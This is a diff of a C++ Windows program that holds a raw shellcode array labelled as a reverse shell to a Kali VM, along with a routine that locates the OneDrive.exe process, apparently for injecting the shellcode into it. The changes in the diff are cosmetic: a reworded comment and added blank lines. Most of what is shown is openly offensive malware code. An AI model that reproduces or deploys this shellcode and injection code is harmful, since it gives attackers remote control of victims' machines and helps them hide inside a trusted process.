@@ -15,7 +15,7 @@
 #define NUM_OF_BYTES NULL
 
 
-// Reverse Shell to my Kali VM
+// Reverse Shell to Kali VM
 const unsigned char SHELLCODE[] = {
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
     0x52, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x51, 0x56, 0x48, 0x8b, 0x52,
@@ -61,9 +61,12 @@ const unsigned char SHELLCODE[] = {
     0xff, 0xc1, 0x48, 0xff, 0xc9, 0x75, 0xdb, 0x5f, 0x41, 0xff, 0xe7
 };
 
+
 using AutoHandle = std::unique_ptr<std::remove_pointer<HANDLE>::type, decltype(&CloseHandle)>;
+
 const std::wstring ONEDRIVE = L"OneDrive.exe";
 constexpr DWORD INVALID_HANDLE = (DWORD)-1;
+
 
 // Returning ProcessEntry32 Structure of OneDrive.exe
 PROCESSENTRY32 getPE() {
@@ -90,6 +93,7 @@ PROCESSENTRY32 getPE() {
     } while (Process32Next(hProcesses.get(), &pe32));
     return {};
 }
+
 
 int main() {
 
